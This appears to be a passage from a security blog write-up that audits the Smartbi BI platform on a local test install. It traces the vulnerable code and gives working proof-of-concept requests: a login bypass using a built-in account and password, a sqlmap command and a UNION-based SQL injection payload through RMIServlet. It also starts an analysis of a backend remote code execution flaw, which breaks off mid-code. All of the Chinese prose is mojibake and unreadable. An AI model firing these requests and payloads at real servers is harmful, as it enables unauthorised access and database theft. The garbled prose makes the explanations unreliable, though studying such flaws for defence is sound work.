gherkin">E:.<br>â”œâ”€Infobrightç”¨äºåˆ†æå‹æ•°æ®å­˜å‚¨<br>â”œâ”€jdkJava å¼€å‘ç¯å¢ƒ<br>â”œâ”€MySQLæ•°æ®åº“æœåŠ¡<br>â”œâ”€SmartbiUnionServerSmartbi çš„ Union Server æ¨¡å—ï¼ˆPresto å¼•æ“ç›¸å…³ï¼‰<br>â”œâ”€smartbixmlaSmartbi XMLA æ¥å£æ¨¡å—ï¼Œä¸»è¦ç”¨äºä¸å¤–éƒ¨å¦‚ Excel çš„æ•°æ®é€è§†è¡¨é€šä¿¡<br>â””â”€TomcatSmartbi ä½¿ç”¨çš„ Web åº”ç”¨æœåŠ¡å™¨ï¼Œéƒ¨ç½²äº†æ ¸å¿ƒ web æ¨¡å—å’Œæ’ä»¶æ‰©å±•<br>    â”œâ”€binåŒ…å«Tomcatçš„å¯åŠ¨/å…³é—­è„šæœ¬ã€Smartbi çš„é…ç½®æ–‡ä»¶ã€è¿è¡Œæ—¥å¿—<br>    |<span class="hljs-string">   </span>|<span class="hljs-string">  exts-smartbiæ‰©å±•æ¨¡å—</span><br><span class="hljs-string">    </span>|<span class="hljs-string"></span>|<span class="hljs-string">  Index-smartbiæœç´¢ç´¢å¼•</span><br><span class="hljs-string">    </span>|<span class="hljs-string"></span>|<span class="hljs-string">  mlogs-smartbiæ¨¡å—çº§åˆ«æ—¥å¿—</span><br><span class="hljs-string">    </span>|<span class="hljs-string"></span>|<span class="hljs-string">  SmartbiX-ExtractData æ•°æ®å¯¼å‡ºæ¨¡å—</span><br><span class="hljs-string">    </span>|<span class="hljs-string">   </span>|<span class="hljs-string">  smartbi_repoBackupä»“åº“å¤‡ä»½</span><br><span class="hljs-string">    </span>|<span class="hljs-string"></span><br><span class="hljs-string">    â”œâ”€confé…ç½®æ–‡ä»¶æ‰€åœ¨</span><br><span class="hljs-string">   </span>|<span class="hljs-string">â”‚  catalina.policy</span><br><span class="hljs-string"></span>|<span class="hljs-string">â”‚  catalina.properties</span><br><span class="hljs-string"></span>|<span class="hljs-string">â”‚  context.xml</span><br><span class="hljs-string"></span>|<span class="hljs-string">â”‚  logging.properties</span><br><span class="hljs-string"></span>|<span class="hljs-string">â”‚  server.xml</span><br><span class="hljs-string"></span>|<span class="hljs-string">â”‚  tomcat-users.xml</span><br><span class="hljs-string"></span>|<span class="hljs-string">â”‚  web.xml</span><br><span class="hljs-string"></span>|<span class="hljs-string">â”‚</span><br><span class="hljs-string"></span>|<span class="hljs-string">â””â”€Catalina</span><br><span class="hljs-string">    </span>|<span class="hljs-string">â””â”€localhost</span><br><span class="hljs-string">    â”œâ”€libåŒ…å«Tomcatè¿è¡Œæ‰€éœ€çš„JARåº“æ–‡ä»¶</span><br><span class="hljs-string">    â”œâ”€logs</span><br><span class="hljs-string">    â”œâ”€temp</span><br><span class="hljs-string">    â”œâ”€webappså®é™…éƒ¨ç½²çš„Webåº”ç”¨ç¨‹åº</span><br><span class="hljs-string">    â”œâ”€work Tomcat è¿è¡Œæ—¶è‡ªåŠ¨ç”Ÿæˆçš„ JSP ç¼–è¯‘ç¼“å­˜</span><br></code></pre></td></tr></table></figure><p>åœ¨æ‰¾æºç çš„è¿‡ç¨‹ä¸­ï¼Œçœ‹åˆ°è¯¥ç³»ç»Ÿä½¿ç”¨äº† Servlet æ¡†æ¶ï¼Œç†è§£ Servlet æ¡†æ¶å¯¹åç»­çš„ä»£ç ç†è§£æœ‰å¸®åŠ©</p><blockquote><p>servlet</p><p><a href="https://86263008.github.io/web2024/back/java/jsp/servlet/index.html">https://86263008.github.io/web2024/back/java/jsp/servlet/index.html</a></p><p><a href="https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11">https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11</a></p><p><a href="https://blog.csdn.net/yxmoar/article/details/109889006">https://blog.csdn.net/yxmoar/article/details/109889006</a></p></blockquote><h1 id="å†å²æ¼æ´ï¼š"><a href="#å†å²æ¼æ´ï¼š" class="headerlink" title="å†å²æ¼æ´ï¼š"></a>å†å²æ¼æ´ï¼š</h1><h2 id="æœªæˆæƒè®¿é—®"><a href="#æœªæˆæƒè®¿é—®" class="headerlink" title="æœªæˆæƒè®¿é—®"></a>æœªæˆæƒè®¿é—®</h2><blockquote><p>Smartbi èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´</p><p><a href="https://www.freebuf.com/vuls/373015.html">https://www.freebuf.com/vuls/373015.html</a></p></blockquote><p>ç½‘ä¸Šçš„ èº«ä»½è®¤è¯&#x2F;å†…ç½®ç”¨æˆ·ç™»é™† ç»•è¿‡çš„ä»£ç å’Œv8.5ç‰ˆæœ¬çš„æœ‰ä¸€äº›åŒºåˆ«ï¼Œä¸è¿‡è¿˜æ˜¯èƒ½è·Ÿè¸ªåˆ°ä»£ç æ¼æ´ç‚¹</p><p>1ã€ä»£ç åˆ†æ</p><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\filter\CheckIsLoggedFilter.class</p><p>é¦–å…ˆæ‰¾åˆ° CheckIsLoggedFilter.class æ–‡ä»¶çš„ needToCheck() æ–¹æ³•ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071648181.png" alt="20250801173411982"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">needToCheck</span><span class="hljs-params">(String className, String methodName)</span> &#123;<br>    <span class="hljs-comment">//åˆ¤æ–­ className éç©ºä¸”ä¸æ˜¯ BIConfigService ï¼ˆ BIConfigService æ˜¯å®Œå…¨ä¿¡ä»»çš„æœåŠ¡ç±»ï¼Œä¸éœ€è¦ä»»ä½•ç™»å½•æ ¡éªŒï¼‰</span><br>    <span class="hljs-keyword">if</span> (!StringUtil.isNullOrEmpty(className) &amp;&amp; !className.equals(<span class="hljs-string">&quot;BIConfigService&quot;</span>)) &#123;<br>        <span class="hljs-comment">//å¦‚æœè°ƒç”¨çš„æ˜¯ UserService ä¸­çš„æ–¹æ³•ï¼Œå³ methodName å±äº&#123;&quot;login&quot;, &quot;loginFor&quot;, &quot;clickLogin&quot;, &quot;loginFromDB&quot;, &quot;logout&quot;, &quot;isLogged&quot;, &quot;isLoginAs&quot;, &quot;checkVersion&quot;, &quot;hasLicense&quot;&#125;</span><br>        <span class="hljs-keyword">if</span> (className.equals(<span class="hljs-string">&quot;UserService&quot;</span>) &amp;&amp; StringUtil.isInArray(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;login&quot;</span>, <span class="hljs-string">&quot;loginFor&quot;</span>, <span class="hljs-string">&quot;clickLogin&quot;</span>, <span class="hljs-string">&quot;loginFromDB&quot;</span>, <span class="hljs-string">&quot;logout&quot;</span>, <span class="hljs-string">&quot;isLogged&quot;</span>, <span class="hljs-string">&quot;isLoginAs&quot;</span>, <span class="hljs-string">&quot;checkVersion&quot;</span>, <span class="hljs-string">&quot;hasLicense&quot;</span>&#125;)) &#123;<br>            <span class="hljs-comment">//åˆ™ä¸éœ€è¦ç™»å½•éªŒè¯</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ‰¾æ‰¾ CheckIsLoggedFilter æ˜¯åœ¨å“ªé‡Œåˆ©ç”¨çš„ï¼Ÿ</p><p> æ‰¾åˆ°åœ¨web.xmlä¸­æœ‰æˆ‘ä»¬éœ€è¦çš„è·¯ç”± <code>/vision/RMIServlet</code></p><blockquote><p>çœ‹åˆ°çš„æ–‡ç« ä¸­éƒ½æ˜¯å…ˆçŸ¥é“äº† RMIServlet è¿™ä¸ªè·¯ç”±ï¼Œç„¶åæ‰¾åˆ° CheckIsLoggedFilter </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071652623.png" alt="20250801175223846"></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071652566.png" alt="20250801174751116"></p><p>å°è¯•è®¿é—® <a href="http://localhost:18080/smartbi/vision/RMIServlet">http://localhost:18080/smartbi/vision/RMIServlet</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071653701.png" alt="20250801174912101"></p><p>POCï¼š</p><p>ä¸»è¦ç»“æ„ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:18080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-dts">classN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>UserService<span class="hljs-variable">&amp;</span>methodN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>loginFromDB<span class="hljs-variable">&amp;params</span>=[<span class="hljs-string">&quot;service&quot;</span>,<span class="hljs-string">&quot;0a&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>å†…ç½®ç”¨æˆ·ï¼ˆserviceï¼‰ï¼Œå£ä»¤ä¸º0aï¼›publicã€systemå¯èƒ½ä¸å­˜åœ¨ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071657532.png" alt="20250806083335304"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071657358.png" alt="20250801175555800"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658122.png" alt="20250801175813702"></p><p>ä½¿ç”¨hackbarä¹Ÿå¯ä»¥ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658447.png" alt="20250801180133641"></p><p>ä¹‹åè®¿é—® <a href="http://localhost:18080/smartbi/vision/">http://localhost:18080/smartbi/vision/</a></p><p>å‘ç°å·²ç»è¿›å…¥åå°</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658299.png" alt="20250801180228087"></p><h2 id="SQLæ³¨å…¥ï¼ˆFileResourceï¼‰"><a href="#SQLæ³¨å…¥ï¼ˆFileResourceï¼‰" class="headerlink" title="SQLæ³¨å…¥ï¼ˆFileResourceï¼‰"></a>SQLæ³¨å…¥ï¼ˆFileResourceï¼‰</h2><p>FileResource æ˜¯ç”¨äºå¤„ç†æ–‡ä»¶çš„ Servlet</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658975.png" alt="20250802132757662"></p><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\fileresource\FileResourceServlet.class</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658788.png" alt="20250802132840122"></p><p>åˆ†æä»£ç ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658880.png" alt="20250802133545296"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//ä»è¯·æ±‚ä¸­è·å– resID</span><br>    resID = request.getParameter(<span class="hljs-string">&quot;resId&quot;</span>);<br>    <span class="hljs-comment">//åˆå§‹åŒ– headerType ä¸º inlineï¼Œinline è¡¨ç¤ºæµè§ˆå™¨å°è¯•ç›´æ¥åœ¨é¡µé¢ä¸­æ‰“å¼€æ–‡ä»¶ï¼ˆæ¯”å¦‚ PDFã€å›¾ç‰‡ï¼‰</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">headerType</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;inline&quot;</span>;<br>    <span class="hljs-comment">//åˆ¤æ–­æ“ä½œç±»å‹ opType æ˜¯ &quot;OPEN&quot; è¿˜æ˜¯ &quot;DOWNLOAD&quot;</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;OPEN&quot;</span>.equals(opType)) &#123;<br>        actionType = OperationType.FILE_RESOURCE_OPEN;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        actionType = OperationType.FILE_RESOURCE_DOWNLOAD;<br>        headerType = <span class="hljs-string">&quot;attachment&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//ä½¿ç”¨ Connection å¯¹è±¡åˆ›å»º Statementï¼Œç”¨äºæ‰§è¡Œ SQL </span><br>    <span class="hljs-type">Statement</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> conn.createStatement();<br>    <span class="hljs-comment">//æ‰§è¡Œ SQL æŸ¥è¯¢ï¼Œä» t_fileresource è¡¨ä¸­æŸ¥æ‰¾æŒ‡å®š resID çš„èµ„æºæ–‡ä»¶ä¿¡æ¯</span><br>    <span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stat.executeQuery(<span class="hljs-string">&quot;select c_content,c_name,c_alias,c_type from t_fileresource where c_id = &#x27;&quot;</span> + resID + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>æ²¡æœ‰å¯¹ resID å‚æ•°è¿›è¡Œè¿‡æ»¤ç›´æ¥ä½¿ç”¨ executeQuery() æ‹¼æ¥æ‰§è¡Œsqlè¯­å¥ï¼Œé€ æˆsqlæ³¨å…¥</strong></p><p>æ„é€ payloadï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:18080</span>/smartbi/vision/FileResource?resId=<span class="hljs-number">1</span>&amp;opType=DOWNLOAD<br></code></pre></td></tr></table></figure><p>å¯ä»¥sqlmapè·‘ä¸€ä¸‹ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://127.0.0.1:18080/smartbi/vision/FileResource?resId=1&amp;opType=DOWNLOAD&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658445.png" alt="20250802140622564"></p><h2 id="SQLæ³¨å…¥ï¼ˆRMIServletï¼‰"><a href="#SQLæ³¨å…¥ï¼ˆRMIServletï¼‰" class="headerlink" title="SQLæ³¨å…¥ï¼ˆRMIServletï¼‰"></a>SQLæ³¨å…¥ï¼ˆRMIServletï¼‰</h2><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\repository\FileResourceDAO.class</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659185.png" alt="20250805165508359"></p><p>getFileResourceæ–¹æ³•æ¥æ”¶å‚æ•° id ï¼Œç›´æ¥æ‹¼æ¥SQlè¯­å¥æŸ¥è¯¢ t_fileresource è¡¨ï¼Œæ²¡æœ‰å¯¹ id è¿›è¡Œè¿‡æ»¤æˆ–è€…å…¶ä»–çš„å®‰å…¨æªæ–½ï¼Œå­˜åœ¨SQLæ³¨å…¥é£é™©</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659316.png" alt="20250805181321541"></p><p>getFileResourceæ–¹æ³•åœ¨URLLinkServiceä¸­è°ƒç”¨ï¼š</p><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\client\urllink\URLLinkService.class</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659108.png" alt="20250805181341517"></p><p><strong>æ¼æ´å¤ç°ï¼š</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-sqf">Content-<span class="hljs-built_in">Type</span>: application/x-www-form-urlencoded</span><br><span class="language-sqf"></span><br><span class="language-sqf"><span class="hljs-built_in">className</span>=UrlLinkService&amp;methodName=getFileResource&amp;<span class="hljs-built_in">params</span>=[<span class="hljs-string">&quot;1&#x27;union select database(),2,3,4,5,6#&quot;</span>]</span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:18080<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=7DDE39A449342C004D2F35ABF13BB5AB<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>99<br><br><span class="language-dts">classN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>UrlLinkService<span class="hljs-variable">&amp;</span>methodN<span class="hljs-attr">ame</span><span class="hljs-operator">=</span>getFileResource<span class="hljs-variable">&amp;params</span>=[<span class="hljs-string">&quot;1&#x27;union select database(),2,3,4,5,6#&quot;</span>]</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659622.png" alt="20250805182305339"></p><h2 id="åå°rce"><a href="#åå°rce" class="headerlink" title="åå°rce"></a>åå°rce</h2><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\sync\SyncServlet.class</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659333.png" alt="20250802145216052"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (!ServletFileUpload.isMultipartContent(request)) &#123;<br>    request.setCharacterEncoding(<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;type&quot;</span>);<br>    response.setBufferSize(<span class="hljs-number">4096</span>);<br>    <span class="hljs-comment">//type=sqldictsync æ—¶æ‰§è¡Œ</span><br>    <span class="hljs-keyword">if</span> (type.equals(<span class="hljs-string">&quot;sqldictsync&quot;</span>)) &#123;<br>        <span class="hljs-comment">//è®°å½•æ—¶é—´</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();<br>        <span class="hljs-comment">//æ•°æ®åº“è¿æ¥å‚æ•°</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbType</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbType&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbServer</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbServer&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbName</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbName&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbUser</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbUser&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">dbPass</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;dbPass&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">querySql</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;querySql&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">dbNameOnly</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;true&quot;</span>.equals(request.getParameter(<span class="hljs-string">&quot;dbNameOnly&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">clientId</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">//è¾“å‡ºè°ƒè¯•æ—¥å¿—ï¼Œè®°å½•æ•°æ®åº“åã€æŸ¥è¯¢è¯­å¥ç­‰</span><br>        log.debug(<span class="hljs-string">&quot;sqldictsync[dbName:&quot;</span> + dbName + <span class="hljs-string">&quot;,dbNameOnly:&quot;</span> + dbNameOnly + <span class="hljs-string">&quot;,querySql:&quot;</span> + querySql + <span class="hljs-string">&quot;]&quot;</span>);<br>        <span class="hljs-comment">//å¦‚æœ dbNameOnly == trueï¼Œæ•°æ®åº“åå’Œ SQL è¿›è¡ŒåŒæ­¥ï¼Œæ‰§è¡ŒSyncResources</span><br>        <span class="hljs-keyword">if</span> (dbNameOnly) &#123;<br>            clientId = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncResources</span>()).synchronize(dbName, querySql);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//å¦åˆ™å°±å®Œæ•´ä½¿ç”¨æ‰€æœ‰è¿æ¥ä¿¡æ¯è¿›è¡Œæ•°æ®åº“è¿æ¥å’Œ SQL æŸ¥è¯¢</span><br>            clientId = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SyncResources</span>()).synchronize(dbType, dbServer, dbName, dbUser, dbPass, querySql);<br>        &#125;<br></code></pre></td></tr></table></figure><p>æ­¤å¤„çš„å‚æ•° dbTypeã€dbServerã€dbNameç­‰å…¨éƒ¨ç”±ç”¨æˆ·è¾“å…¥ï¼Œå¯æ§ä¸”æ— ä»»ä½•æ£€éªŒã€è¿‡æ»¤</p><p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\sync\SyncResources.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-comment">//æ¥æ”¶ç”¨æˆ·è¾“å…¥çš„æ•°æ®åº“å‚æ•°</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">synchronize</span><span class="hljs-params">(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String querySql)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//ä½¿ç”¨ DbUtil.getConnection åˆ›å»ºæ•°æ®åº“è¿æ¥ï¼Œç»§ç»­è·Ÿè¿›</span><br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> DbUtil.getConnection(dbType, dbServer, dbName, dbUser, dbPass, (String)<span class="hljs-literal">null</span>);<br>    <span class="hljs-keyword">if</span> (conn == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(StringUtil.getLanguageValue(<span class="hljs-string">&quot;Incomingconnectionparametererrorestablishconnectionfailed&quot;</span>));<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">colsCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br>        <span class="hljs-type">Reader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultSetReader</span>(conn, querySql, colsCount);<br>        <span class="hljs-type">DictTree</span> <span class="hljs-variable">tree</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DictTree</span>(reader);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.doSynchronize(tree);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>E:\Smartbi\SmartbiUnionServer\plugin\SmartbiPrestoClickHouseJdbc\smartbiCommon.jar!\smartbi\util\DbUtil.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title 